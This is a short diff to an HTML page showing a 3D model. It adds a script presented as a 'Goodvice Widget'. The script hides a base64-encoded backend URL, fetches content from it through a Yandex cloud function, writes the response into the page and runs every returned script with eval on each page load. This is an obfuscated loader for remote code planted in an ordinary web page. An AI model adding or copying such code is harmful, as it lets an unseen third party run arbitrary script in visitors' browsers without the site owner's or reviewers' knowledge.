@@ -49,5 +49,29 @@
   
 </model-viewer>
 	
+	
+	
+	<div id='widget'></div>
+	<script type='text/javascript'>
+   const url = "aHR0cHM6Ly9iYWNrZW5kLXQ0M3U2bWM2d3EtZXcuYS5ydW4uYXBwL2FwaS9nZXRXaWRnZXQ/Y2lkPUhXTE5aZ2MwS3YxTlp4MjBsU1Z4JmlkPW9IYmV6bDlTZWxTVUlPNGRxS0No";
+   (function(document, id, source) {
+	let req = new XMLHttpRequest();
+	req.addEventListener("load", reqListener);
+	req.open("GET", source);
+	req.send();
+	function reqListener() {
+		if (this.readyState == 4 && this.status == 200) {
+			let container = document.getElementById(id);
+			container.innerHTML = this.responseText;
+			let scripts = container.getElementsByTagName("script");
+			for (let i = 0; i < scripts.length; i++) {
+				eval(scripts[i].innerText);
+			}
+		} else if (this.status == 503) {
+			console.log(this.statusText, "Goodvice Widget will not be shown");
+		}
+	}
+  })(document, "widget", "https://functions.yandexcloud.net/d4e1s2enrh61ft8bd83b?url=" + url);
+</script>
     </body>
 </html>
